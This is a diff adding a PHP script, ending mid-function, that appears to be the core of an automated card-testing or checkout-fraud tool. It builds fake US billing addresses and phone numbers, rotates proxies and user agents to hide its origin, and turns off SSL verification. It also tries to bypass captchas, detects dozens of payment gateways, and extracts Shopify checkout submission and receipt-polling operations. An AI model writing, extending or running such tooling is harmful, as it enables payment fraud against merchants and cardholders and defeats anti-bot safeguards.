@@ -1,0 +1,3299 @@
+<?php
+error_reporting(E_ALL & ~E_DEPRECATED);
+// Extend script execution limit to avoid premature fatal timeouts during network calls
+@set_time_limit(300);
+
+// Environment sanity check: require cURL extension
+if (!extension_loaded('curl')) {
+    header('Content-Type: application/json');
+    echo json_encode([
+        'error' => 'PHP cURL extension is not enabled',
+        'fix' => 'Start the server via START_SERVER.bat (uses PHP with cURL) or enable extension=curl in your php.ini, then restart the server.',
+        'php_version' => PHP_VERSION,
+    ]);
+    exit;
+}
+
+$maxRetries = 5;
+$retryCount = 0;
+$start_time = microtime(true);
+
+require_once 'ho.php';
+$agent = new userAgent();
+$ua = $agent->generate('windows');
+
+// Proxy rotation setup: use ProxyManager to rotate proxy each request when available
+require_once 'ProxyManager.php';
+$__pm = new ProxyManager();
+$__pm_count = file_exists('ProxyList.txt') ? $__pm->loadFromFile('ProxyList.txt') : 0;
+if (isset($_GET['debug'])) {
+    error_log("[DEBUG] Loaded $__pm_count proxies from ProxyList.txt");
+}
+// Default: do NOT auto-rotate proxy per request (opt-in via ?rotate=1)
+$ROTATE_PROXY_PER_REQUEST = false;
+// Optional runtime override: rotate=1|0 (ignored if a specific ?proxy= is supplied)
+if (!empty($_GET['rotate'])) {
+    $rot = trim((string)$_GET['rotate']);
+    if ($rot === '0' || $rot === 'false') { $ROTATE_PROXY_PER_REQUEST = false; }
+    elseif ($rot === '1' || $rot === 'true') { if (!isset($_GET['proxy']) || empty($_GET['proxy'])) $ROTATE_PROXY_PER_REQUEST = true; }
+}
+
+// User-Agent rotation control (default: do NOT rotate per request step)
+$ROTATE_UA_PER_STEP = false;
+if (isset($_GET['rotate_ua'])) {
+    $rua = strtolower((string)$_GET['rotate_ua']);
+    if ($rua === '0' || $rua === 'false') $ROTATE_UA_PER_STEP = false;
+    if ($rua === '1' || $rua === 'true') $ROTATE_UA_PER_STEP = true;
+}
+
+// Per-request stable User-Agent for the entire flow (optimized with caching)
+if (!function_exists('flow_user_agent')) {
+    function flow_user_agent(): string {
+        // When rotating UA per step, generate a fresh UA for each call
+        if (isset($GLOBALS['ROTATE_UA_PER_STEP']) && $GLOBALS['ROTATE_UA_PER_STEP'] === true) {
+            static $uaGen = null;
+            if ($uaGen === null) {
+                $uaGen = new userAgent();
+            }
+            return $uaGen->generate('windows');
+        }
+        // Otherwise, keep one stable UA for the whole request flow (cached)
+        if (!isset($GLOBALS['__flow_ua'])) {
+            static $uaGen = null;
+            if ($uaGen === null) {
+                $uaGen = new userAgent();
+            }
+            $GLOBALS['__flow_ua'] = $uaGen->generate('windows');
+        }
+        return $GLOBALS['__flow_ua'];
+    }
+}
+
+// Parse proxy string into components, supporting user:pass@host:port and socks5h/socks4a
+function parse_proxy_components(string $proxyStr): array {
+    $raw = trim($proxyStr);
+    $type = 'http';
+    $rest = $raw;
+    // Extract scheme if present
+    if (preg_match('/^(https?|socks5h?|socks4a?|socks[45]):\/\/(.+)$/i', $raw, $m)) {
+        $type = strtolower($m[1]);
+        $rest = $m[2];
+    }
+    
+    $user = '';
+    $pass = '';
+    $host = '';
+    $port = '';
+    
+    // Format 1: user:pass@host:port
+    if (strpos($rest, '@') !== false) {
+        list($auth, $hostport) = explode('@', $rest, 2);
+        if (strpos($auth, ':') !== false) {
+            list($user, $pass) = explode(':', $auth, 2);
+        } else {
+            $user = $auth;
+        }
+        // Split host:port
+        if (strpos($hostport, ':') !== false) {
+            list($host, $port) = explode(':', $hostport, 2);
+        } else {
+            $host = $hostport;
+        }
+    }
+    // Format 2: ip:port:user:pass (colon-separated with exactly 4 parts)
+    else {
+        $parts = explode(':', $rest);
+        if (count($parts) === 4) {
+            // Validate that second part is numeric (port)
+            if (is_numeric($parts[1])) {
+                $host = $parts[0];
+                $port = $parts[1];
+                $user = $parts[2];
+                $pass = $parts[3];
+            }
+        }
+        // Format 3: host:port (no credentials)
+        elseif (count($parts) === 2) {
+            $host = $parts[0];
+            $port = $parts[1];
+        }
+    }
+    
+    return [
+        'type' => $type,
+        'host' => $host,
+        'port' => $port,
+        'user' => $user,
+        'pass' => $pass,
+    ];
+}
+
+// Transform username for rotating/residential proxies: placeholders and session
+function transform_rotating_username(string $user): string {
+    $u = $user;
+    $rotate = false;
+    if (isset($_GET['rotateSession'])) {
+        $v = strtolower((string)$_GET['rotateSession']);
+        $rotate = ($v === '1' || $v === 'true' || $v === 'yes');
+    }
+    $country = isset($_GET['country']) ? strtolower(trim((string)$_GET['country'])) : '';
+    // session token
+    $sess = substr(bin2hex(random_bytes(4)), 0, 8);
+    if (strpos($u, '{session}') !== false) {
+        $u = str_replace('{session}', $sess, $u);
+    } elseif ($rotate && $u !== '' && strpos($u, 'session-') === false) {
+        $u .= '-session-' . $sess;
+    }
+    if ($country !== '') {
+        $u = str_replace('{country}', $country, $u);
+    }
+    return $u;
+}
+
+// Extract target site early so proxy testing can validate against it when available
+$__requested_site_param = filter_input(INPUT_GET, 'site', FILTER_SANITIZE_URL);
+$__requested_site_for_test = null;
+if (!empty($__requested_site_param)) {
+    $host = parse_url($__requested_site_param, PHP_URL_HOST);
+    if (!empty($host)) {
+        $__requested_site_for_test = 'https://' . $host;
+    }
+}
+
+require_once 'add.php';
+$num_us = $randomAddress['numd'];
+$address_us = $randomAddress['address1'];
+$address = $num_us.' '.$address_us;
+$city_us = $randomAddress['city'];
+$state_us = $randomAddress['state'];
+$zip_us = $randomAddress['zip'];
+
+require_once 'no.php';
+$areaCode = $areaCodes[array_rand($areaCodes)];
+$phone = sprintf("+1%d%03d%04d", $areaCode, rand(200, 999), rand(1000, 9999));
+
+// Important functions start
+// Lightweight embedded utilities: CaptchaSolver and GatewayDetector
+// Pull runtime config from query (optional): cto, to, sleep, v4
+function runtime_cfg(): array {
+    // Optimized: reduced default timeouts for faster execution
+    $cto = isset($_GET['cto']) ? max(1, (int)$_GET['cto']) : 3;   // connect timeout seconds (reduced from 5 to 3)
+    $to  = isset($_GET['to'])  ? max(3, (int)$_GET['to'])  : 10;  // total timeout seconds (reduced from 15 to 10)
+    $slp = isset($_GET['sleep']) ? max(0, (int)$_GET['sleep']) : 0; // sleep seconds between phases (default 0 for speed)
+    $v4  = isset($_GET['v4']) ? (bool)$_GET['v4'] : true; // prefer IPv4 (often faster on some ISPs)
+    return ['cto'=>$cto,'to'=>$to,'sleep'=>$slp,'v4'=>$v4];
+}
+
+// Apply common timeouts and perf flags to a curl handle
+function apply_common_timeouts($ch): void {
+    $cfg = runtime_cfg();
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $cfg['cto']);
+    curl_setopt($ch, CURLOPT_TIMEOUT, $cfg['to']);
+    curl_setopt($ch, CURLOPT_ENCODING, '');
+    curl_setopt($ch, CURLOPT_TCP_NODELAY, true);
+    curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 60);
+    // Relax SSL verification to avoid self-signed chain issues when proxied
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    if ($cfg['v4'] && defined('CURL_IPRESOLVE_V4')) {
+        curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
+    }
+}
+if (!class_exists('CaptchaSolver')) {
+class CaptchaSolver {
+    // Use the per-request stable UA
+    private static function rotatingUA(): string { return flow_user_agent(); }
+    public static function detectCaptcha(string $html): array {
+        $h = strtolower($html);
+        $res = [];
+        if (strpos($h, 'hcaptcha') !== false || strpos($h, 'h-captcha') !== false) {
+            preg_match('/data-sitekey=["\']([^"\']+)["\']/', $html, $m);
+            $res['hcaptcha'] = ['type' => 'hcaptcha', 'sitekey' => $m[1] ?? null];
+        }
+        if (strpos($h, 'recaptcha') !== false || strpos($h, 'google.com/recaptcha') !== false) {
+            preg_match('/data-sitekey=["\']([^"\']+)["\']/', $html, $m);
+            $res['recaptcha_v2'] = ['type' => 'recaptcha_v2', 'sitekey' => $m[1] ?? null];
+        }
+        if (strpos($html, 'grecaptcha.execute') !== false) {
+            preg_match('/grecaptcha\.execute\(["\']([^"\']+)["\']/', $html, $m);
+            $res['recaptcha_v3'] = ['type' => 'recaptcha_v3', 'sitekey' => $m[1] ?? null];
+        }
+        return $res;
+    }
+    public static function requiresCaptcha(string $html): bool {
+        $h = strtolower($html);
+        return (strpos($h, 'hcaptcha') !== false || strpos($h, 'recaptcha') !== false || strpos($h, 'captcha') !== false);
+    }
+    public static function tryHeaderSkip(string $url, ?string $cookieFile = null): array {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, [
+            'User-Agent: '.self::rotatingUA(),
+            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language: en-US,en;q=0.9',
+            'Connection: keep-alive'
+        ]);
+        if ($cookieFile) {
+            curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
+            curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
+        }
+        // Reuse current proxy if any
+        if (function_exists('apply_proxy_if_used')) {
+            apply_proxy_if_used($ch, $url);
+        }
+        $resp = curl_exec($ch);
+        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        return ['success' => ($code == 200), 'response' => $resp, 'http_code' => $code];
+    }
+}
+}
+
+if (!class_exists('GatewayDetector')) {
+class GatewayDetector {
+    // Comprehensive list of 50+ payment gateways with detection patterns
+    private static $gatewayPatterns = [
+        'stripe' => ['stripe', 'pk_live_', 'pk_test_', 'stripe.com', 'stripejs', 'stripe-checkout'],
+        'paypal' => ['paypal', 'paypal.com', 'braintree', 'paypalobjects', 'paypal-button', 'paypal-sdk'],
+        'razorpay' => ['razorpay', 'rzp_', 'razorpay.com', 'razorpaycheckout'],
+        'square' => ['square', 'squareup.com', 'square-commerce', 'square-payments'],
+        'braintree' => ['braintree', 'braintreegateway.com', 'braintreepayments'],
+        'adyen' => ['adyen', 'adyen.com', 'adyen-payment'],
+        'authorize.net' => ['authorize.net', 'authorizenet', 'authorize_net'],
+        'checkout.com' => ['checkout.com', 'cko', 'checkout-sdk'],
+        'worldpay' => ['worldpay', 'worldpay.com'],
+        'sagepay' => ['sagepay', 'opayo', 'sage-pay'],
+        'payu' => ['payu', 'payu.in', 'secure.payu', 'payubiz', 'bolt'],
+        'paytm' => ['paytm', 'paytm.com'],
+        'phonepe' => ['phonepe', 'phonepe.com'],
+        'shopify_payments' => ['shopify payments', 'shopifypayments', 'shopify-payment'],
+        'amazon_pay' => ['amazon pay', 'amazonpay', 'amazon-payments'],
+        'apple_pay' => ['apple pay', 'applepay', 'apple-pay'],
+        'google_pay' => ['google pay', 'googlepay', 'gpay'],
+        'klarna' => ['klarna', 'klarna.com'],
+        'afterpay' => ['afterpay', 'afterpay.com'],
+        'affirm' => ['affirm', 'affirm.com'],
+        'sezzle' => ['sezzle', 'sezzle.com'],
+        'zip' => ['zip', 'zip.co'],
+        'laybuy' => ['laybuy', 'laybuy.com'],
+        'quadpay' => ['quadpay', 'quadpay.com'],
+        'splitit' => ['splitit', 'splitit.com'],
+        'payoneer' => ['payoneer', 'payoneer.com'],
+        'skrill' => ['skrill', 'skrill.com'],
+        'neteller' => ['neteller', 'neteller.com'],
+        'payza' => ['payza', 'payza.com'],
+        'perfect_money' => ['perfect money', 'perfectmoney'],
+        'webmoney' => ['webmoney', 'webmoney.ru'],
+        'qiwi' => ['qiwi', 'qiwi.com'],
+        'yandex_money' => ['yandex money', 'yandexmoney'],
+        'alipay' => ['alipay', 'alipay.com'],
+        'wechat_pay' => ['wechat pay', 'wechatpay'],
+        'unionpay' => ['unionpay', 'union-pay'],
+        'jcb' => ['jcb', 'jcb.co.jp'],
+        'discover' => ['discover', 'discover.com'],
+        'amex' => ['american express', 'amex', 'americanexpress'],
+        'mastercard' => ['mastercard', 'mastercard.com'],
+        'visa' => ['visa', 'visa.com'],
+        'dinerclub' => ['diners club', 'dinerclub'],
+        'maestro' => ['maestro', 'maestrocard'],
+        'mollie' => ['mollie', 'mollie.com'],
+        'ingenico' => ['ingenico', 'ingenico.com'],
+        'fiserv' => ['fiserv', 'fiserv.com'],
+        'first_data' => ['first data', 'firstdata'],
+        'elavon' => ['elavon', 'elavon.com'],
+        'tsys' => ['tsys', 'tsys.com'],
+        'vantiv' => ['vantiv', 'vantiv.com'],
+        'payline' => ['payline', 'payline.com'],
+        'paytrace' => ['paytrace', 'paytrace.com'],
+    ];
+    
+    // Payment methods supported by each gateway
+    private static $gatewayMethods = [
+        'stripe' => ['credit_card', 'debit_card', 'apple_pay', 'google_pay', 'amex', 'visa', 'mastercard'],
+        'paypal' => ['paypal', 'credit_card', 'debit_card', 'venmo'],
+        'razorpay' => ['credit_card', 'debit_card', 'netbanking', 'upi', 'wallet'],
+        'square' => ['credit_card', 'debit_card', 'apple_pay', 'google_pay', 'cash_app'],
+        'braintree' => ['credit_card', 'debit_card', 'paypal', 'venmo', 'apple_pay', 'google_pay'],
+        'adyen' => ['credit_card', 'debit_card', 'apple_pay', 'google_pay', 'alipay', 'wechat_pay'],
+        'authorize.net' => ['credit_card', 'debit_card', 'echeck', 'apple_pay'],
+        'checkout.com' => ['credit_card', 'debit_card', 'apple_pay', 'google_pay'],
+        'worldpay' => ['credit_card', 'debit_card', 'apple_pay', 'google_pay'],
+        'sagepay' => ['credit_card', 'debit_card'],
+        'payu' => ['credit_card', 'debit_card', 'netbanking', 'upi', 'wallet'],
+        'paytm' => ['paytm_wallet', 'credit_card', 'debit_card', 'netbanking', 'upi'],
+        'phonepe' => ['phonepe_wallet', 'upi', 'credit_card', 'debit_card'],
+        'shopify_payments' => ['credit_card', 'debit_card', 'apple_pay', 'google_pay'],
+        'amazon_pay' => ['amazon_pay'],
+        'apple_pay' => ['apple_pay'],
+        'google_pay' => ['google_pay'],
+        'klarna' => ['klarna', 'credit_card'],
+        'afterpay' => ['afterpay'],
+        'affirm' => ['affirm'],
+        'alipay' => ['alipay'],
+        'wechat_pay' => ['wechat_pay'],
+    ];
+    
+    /**
+     * Detect primary payment gateway from response and URL
+     * 
+     * @param string $response HTML/JS response content
+     * @param string $checkoutUrl Checkout URL
+     * @return string Gateway name or 'unknown'
+     */
+    public static function detect(string $response, string $checkoutUrl = ''): string {
+        $r = strtolower($response);
+        $u = strtolower($checkoutUrl);
+        
+        // Check each gateway pattern
+        foreach (self::$gatewayPatterns as $gateway => $patterns) {
+            foreach ($patterns as $pattern) {
+                if (strpos($r, $pattern) !== false || strpos($u, $pattern) !== false) {
+                    return $gateway;
+                }
+            }
+        }
+        
+        return 'unknown';
+    }
+    
+    /**
+     * Detect all payment gateways present (multiple gateways may be available)
+     * 
+     * @param string $response HTML/JS response content
+     * @param string $checkoutUrl Checkout URL
+     * @return array Array of detected gateway names
+     */
+    public static function detectAll(string $response, string $checkoutUrl = ''): array {
+        $r = strtolower($response);
+        $u = strtolower($checkoutUrl);
+        $detected = [];
+        
+        foreach (self::$gatewayPatterns as $gateway => $patterns) {
+            foreach ($patterns as $pattern) {
+                if (strpos($r, $pattern) !== false || strpos($u, $pattern) !== false) {
+                    if (!in_array($gateway, $detected)) {
+                        $detected[] = $gateway;
+                    }
+                }
+            }
+        }
+        
+        return empty($detected) ? ['unknown'] : $detected;
+    }
+    
+    /**
+     * Get supported payment methods for a gateway
+     * 
+     * @param string $gateway Gateway name
+     * @return array Array of supported payment methods
+     */
+    public static function getSupportedMethods(string $gateway): array {
+        return self::$gatewayMethods[$gateway] ?? ['credit_card', 'debit_card'];
+    }
+    
+    /**
+     * Check if a gateway supports a specific payment method
+     * 
+     * @param string $gateway Gateway name
+     * @param string $method Payment method (e.g., 'credit_card', 'apple_pay')
+     * @return bool True if supported
+     */
+    public static function supportsMethod(string $gateway, string $method): bool {
+        $methods = self::getSupportedMethods($gateway);
+        return in_array($method, $methods);
+    }
+    
+    /**
+     * Get all available gateways
+     * 
+     * @return array Array of all gateway names
+     */
+    public static function getAllGateways(): array {
+        return array_keys(self::$gatewayPatterns);
+    }
+}
+}
+function find_between($content, $start, $end) {
+  $startPos = strpos($content, $start);
+  if ($startPos === false) {
+    return '';
+}
+$startPos += strlen($start);
+$endPos = strpos($content, $end, $startPos);
+if ($endPos === false) { 
+    return'';
+}
+return substr($content, $startPos, $endPos - $startPos);
+}
+
+function extractOperationQueryFromFile(string $filePath, string $operationName): ?string {
+    $content = @file_get_contents($filePath);
+    if ($content === false) {
+        return null;
+    }
+    $needles = [
+        'Proposal' => "=> 'query Proposal(",
+        'SubmitForCompletion' => "=> 'mutation SubmitForCompletion(",
+        'PollForReceipt' => "=> 'query PollForReceipt(",
+    ];
+    if (!isset($needles[$operationName])) {
+        return null;
+    }
+    $needle = $needles[$operationName];
+    $pos = strpos($content, $needle);
+    if ($pos === false) {
+        return null;
+    }
+    $start = $pos + strlen("=> '");
+    $end = strpos($content, "',", $start);
+    if ($end === false) {
+        $end = strrpos($content, "'");
+        if ($end === false || $end <= $start) {
+            return null;
+        }
+    }
+    return substr($content, $start, $end - $start);
+}
+
+/**
+ * Detect proxy type from proxy string format
+ * Supports: http://, https://, socks4://, socks5://, or auto-detect from port
+ */
+function get_proxy_type(string $proxy_string): int {
+    $proxy_lower = strtolower($proxy_string);
+    
+    if (strpos($proxy_lower, 'socks5://') === 0 || strpos($proxy_lower, 'socks5h://') === 0) {
+        return CURLPROXY_SOCKS5;
+    }
+    if (strpos($proxy_lower, 'socks4://') === 0 || strpos($proxy_lower, 'socks4a://') === 0) {
+        return CURLPROXY_SOCKS4;
+    }
+    if (strpos($proxy_lower, 'https://') === 0) {
+        return CURLPROXY_HTTPS;
+    }
+    if (strpos($proxy_lower, 'http://') === 0) {
+        return CURLPROXY_HTTP;
+    }
+    
+    // Default to HTTP if no protocol specified
+    return CURLPROXY_HTTP;
+}
+
+function test_proxy_url(string $ip, string $port, string $username = '', string $password = '', string $type = 'http', string $testUrl = 'https://api.ipify.org?format=json'): bool {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $testUrl);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
+    // SOCKS proxies need more time for SSL connections
+    $timeout = ($type === 'socks4' || $type === 'socks5') ? 10 : 5;
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout * 2);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'User-Agent: '.flow_user_agent(),
+        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,application/json;q=0.8,*/*;q=0.7',
+        'Connection: keep-alive'
+    ]);
+
+    // Map type including hostname-resolving variants
+    $ptype = CURLPROXY_HTTP;
+    $lt = strtolower($type);
+    if ($lt === 'socks4' || $lt === 'socks4a') {
+        $ptype = (defined('CURLPROXY_SOCKS4A') && $lt === 'socks4a') ? CURLPROXY_SOCKS4A : CURLPROXY_SOCKS4;
+    } elseif ($lt === 'socks5' || $lt === 'socks5h') {
+        $ptype = (defined('CURLPROXY_SOCKS5_HOSTNAME') && $lt === 'socks5h') ? CURLPROXY_SOCKS5_HOSTNAME : CURLPROXY_SOCKS5;
+    } elseif ($lt === 'https') {
+        $ptype = CURLPROXY_HTTPS;
+    } else {
+        $ptype = CURLPROXY_HTTP;
+    }
+    curl_setopt($ch, CURLOPT_PROXY, $ip . ':' . $port);
+    curl_setopt($ch, CURLOPT_PROXYTYPE, $ptype);
+    // Use CONNECT tunnel for HTTPS targets when proxy is HTTP(S)
+    $scheme = strtolower(parse_url($testUrl, PHP_URL_SCHEME) ?: 'http');
+    $needsTunnel = ($scheme === 'https' && ($ptype === CURLPROXY_HTTP || $ptype === CURLPROXY_HTTPS));
+    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, $needsTunnel);
+    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
+    if (defined('CURLOPT_PROXYHEADER') && $ptype === CURLPROXY_HTTP) {
+        curl_setopt($ch, CURLOPT_PROXYHEADER, ['Proxy-Connection: Keep-Alive']);
+    }
+    if (!empty($username) && !empty($password)) {
+        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username . ':' . $password);
+    }
+
+    $resp = curl_exec($ch);
+    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    // Consider 2xx-4xx as reachable; only 5xx and network failures are hard fails
+    return ($resp !== false && $code >= 200 && $code < 500);
+}
+
+// Backward-compatible wrapper using default ipify test URL
+function test_proxy(string $ip, string $port, string $username = '', string $password = '', string $type = 'http'): bool {
+    return test_proxy_url($ip, $port, $username, $password, $type, 'https://api.ipify.org?format=json');
+}
+
+/**
+ * Auto-detect proxy type by testing all protocols
+ * Returns the working protocol type or null if none work
+ */
+function detect_proxy_type(string $ip, string $port, string $username = '', string $password = '', ?string $preferredTestUrl = null): ?string {
+    // When credentials are present, prioritize HTTP (common for rotating/residential proxies)
+    // Otherwise test: socks5h > socks5 > http > socks4a > socks4 > https
+    $hasAuth = ($username !== '' && $password !== '');
+    if ($hasAuth) {
+        $types = ['http', 'https', 'socks5h', 'socks5', 'socks4a', 'socks4'];
+    } else {
+        $types = ['socks5h', 'socks5', 'http', 'socks4a', 'socks4', 'https'];
+    }
+
+    // Build a list of candidate test URLs: prefer target site, then ipify
+    $urls = [];
+    if (!empty($preferredTestUrl)) { $urls[] = $preferredTestUrl; }
+    $urls[] = 'https://api.ipify.org?format=json';
+    $urls = array_values(array_unique($urls));
+
+    foreach ($types as $type) {
+        foreach ($urls as $u) {
+            if (test_proxy_url($ip, $port, $username, $password, $type, $u)) {
+                return $type;
+            }
+        }
+    }
+    return null;
+}
+
+// Normalize to scheme://ip:port[:user:pass]
+function normalize_proxy_string(string $type, string $ip, string $port, string $user = '', string $pass = ''): string {
+    $base = strtolower($type) . '://' . $ip . ':' . $port;
+    if ($user !== '' && $pass !== '') {
+        $base .= ':' . $user . ':' . $pass;
+    }
+    return $base;
+}
+
+// Save working proxy to file if not already present
+function save_proxy_to_file(string $proxyString, string $file = 'ProxyList.txt'): void {
+    $proxyString = trim($proxyString);
+    if ($proxyString === '') return;
+    $existing = [];
+    if (file_exists($file)) {
+        $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        foreach ($lines as $l) { $existing[trim($l)] = true; }
+    }
+    if (!isset($existing[$proxyString])) {
+        file_put_contents($file, $proxyString . PHP_EOL, FILE_APPEND);
+    }
+}
+
+// Apply proxy to a curl handle if a proxy is selected, enabling CONNECT only for HTTPS targets
+function apply_proxy_if_used($ch, string $url): void {
+    global $proxy_used, $proxy_ip, $proxy_port, $proxy_user, $proxy_pass, $proxy_type;
+    global $ROTATE_PROXY_PER_REQUEST, $__pm, $__pm_count;
+    // Per-request rotation using ProxyManager if enabled and proxies available
+    if ($ROTATE_PROXY_PER_REQUEST && $__pm_count > 0) {
+        $proxy = $__pm->getNextProxy(true); // health-check to keep quality high
+        if ($proxy) {
+            $ptype = strtolower($proxy['type'] ?? 'http');
+            $scheme = strtolower(parse_url($url, PHP_URL_SCHEME) ?: 'http');
+            $needsTunnel = ($scheme === 'https' && ($ptype === 'http' || $ptype === 'https'));
+            $curlType = CURLPROXY_HTTP;
+            if ($ptype === 'socks4') $curlType = CURLPROXY_SOCKS4;
+            elseif ($ptype === 'socks4a' && defined('CURLPROXY_SOCKS4A')) $curlType = CURLPROXY_SOCKS4A;
+            elseif ($ptype === 'socks5') $curlType = CURLPROXY_SOCKS5;
+            elseif ($ptype === 'socks5h' && defined('CURLPROXY_SOCKS5_HOSTNAME')) $curlType = CURLPROXY_SOCKS5_HOSTNAME;
+            elseif ($ptype === 'https') $curlType = CURLPROXY_HTTPS;
+
+            $opts = [
+                CURLOPT_PROXY => $proxy['ip'] . ':' . $proxy['port'],
+                CURLOPT_PROXYTYPE => $curlType,
+                CURLOPT_HTTPPROXYTUNNEL => $needsTunnel,
+                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+            ];
+            if ($curlType === CURLPROXY_HTTPS) {
+                $opts[CURLOPT_SSL_VERIFYPEER] = false;
+                $opts[CURLOPT_SSL_VERIFYHOST] = false;
+            }
+            if (!empty($proxy['user']) && !empty($proxy['pass'])) {
+                $opts[CURLOPT_PROXYUSERPWD] = transform_rotating_username($proxy['user']) . ':' . $proxy['pass'];
+            }
+            if (defined('CURLOPT_PROXYHEADER') && $curlType === CURLPROXY_HTTP) {
+                $opts[CURLOPT_PROXYHEADER] = ['Proxy-Connection: Keep-Alive'];
+            }
+            curl_setopt_array($ch, $opts);
+
+            // Also update globals for final reporting
+            $proxy_used = true;
+            $proxy_ip = $proxy['ip'];
+            $proxy_port = (string)$proxy['port'];
+            $proxy_user = $proxy['user'] ?? '';
+            $proxy_pass = $proxy['pass'] ?? '';
+            $proxy_type = $ptype;
+            return;
+        }
+        // if rotation failed, fall back to configured proxy below
+    }
+    // Fallback: apply the selected/static proxy
+    if (!$proxy_used) return;
+    $ptype = get_proxy_type($proxy_type . '://');
+    $scheme = strtolower(parse_url($url, PHP_URL_SCHEME) ?: 'http');
+    $needsTunnel = ($scheme === 'https' && ($ptype === CURLPROXY_HTTP || $ptype === CURLPROXY_HTTPS));
+
+    $opts = [
+        CURLOPT_PROXY => $proxy_ip . ':' . $proxy_port,
+        CURLOPT_PROXYTYPE => $ptype,
+        CURLOPT_HTTPPROXYTUNNEL => $needsTunnel,
+        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+    ];
+    // If using an HTTPS proxy, some builds require ignoring proxy SSL issues
+    if ($ptype === CURLPROXY_HTTPS) {
+        $opts[CURLOPT_SSL_VERIFYPEER] = false;
+        $opts[CURLOPT_SSL_VERIFYHOST] = false;
+    }
+    if (!empty($proxy_user) && !empty($proxy_pass)) {
+        $opts[CURLOPT_PROXYUSERPWD] = transform_rotating_username($proxy_user) . ':' . $proxy_pass;
+    }
+    if (defined('CURLOPT_PROXYHEADER') && $ptype === CURLPROXY_HTTP) {
+        $opts[CURLOPT_PROXYHEADER] = ['Proxy-Connection: Keep-Alive'];
+    }
+    curl_setopt_array($ch, $opts);
+}
+
+/**
+ * Select first working proxy from ProxyList.txt using parallel testing
+ * - timeout unchanged (default 3s connect/overall)
+ * - tests up to $concurrency proxies at a time
+ * Returns full proxy string (may include scheme) or null
+ */
+function select_working_proxy_parallel(string $file = 'ProxyList.txt', int $timeout = 3, int $concurrency = 200): ?string {
+    if (!file_exists($file)) return null;
+    $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    if (!$lines) return null;
+
+    // Clean lines
+    $proxies = [];
+    foreach ($lines as $line) {
+        $p = trim($line);
+        if ($p === '' || $p[0] === '#') continue;
+        $proxies[] = $p;
+    }
+    if (empty($proxies)) return null;
+
+    // Chunked parallel testing
+    $chunks = array_chunk($proxies, max(1, $concurrency));
+    foreach ($chunks as $chunk) {
+        $mh = curl_multi_init();
+        $handles = [];
+
+        foreach ($chunk as $proxyStr) {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org?format=json');
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            // Parse proxy scheme/type first to determine timeout
+            $type = 'http';
+            $proxyAddr = $proxyStr;
+            if (preg_match('/^(https?|socks4|socks5):\/\/(.+)$/i', $proxyStr, $m)) {
+                $type = strtolower($m[1]);
+                $proxyAddr = $m[2];
+            }
+            // SOCKS proxies need more time for SSL handshake
+            $actualTimeout = ($type === 'socks4' || $type === 'socks5') ? ($timeout * 2) : $timeout;
+            curl_setopt($ch, CURLOPT_TIMEOUT, $actualTimeout);
+            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $actualTimeout);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
+            curl_setopt($ch, CURLOPT_ENCODING, '');
+            curl_setopt($ch, CURLOPT_TCP_NODELAY, true);
+
+            curl_setopt($ch, CURLOPT_PROXY, $proxyAddr);
+            if ($type === 'socks4') {
+                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
+            } elseif ($type === 'socks5') {
+                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+            } else {
+                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+                curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true); // HTTPS target needs CONNECT
+                curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
+                if (defined('CURLOPT_PROXYHEADER')) {
+                    curl_setopt($ch, CURLOPT_PROXYHEADER, ['Proxy-Connection: Keep-Alive']);
+                }
+            }
+
+            curl_multi_add_handle($mh, $ch);
+            $handles[] = ['h' => $ch, 'proxy' => $proxyStr];
+        }
+
+        // Run this batch
+        $running = null;
+        do {
+            $mrc = curl_multi_exec($mh, $running);
+            if ($running) curl_multi_select($mh, 1.0);
+        } while ($running && $mrc == CURLM_OK);
+
+        // Collect results
+        $winner = null;
+        foreach ($handles as $entry) {
+            $ch = $entry['h'];
+            $resp = curl_multi_getcontent($ch);
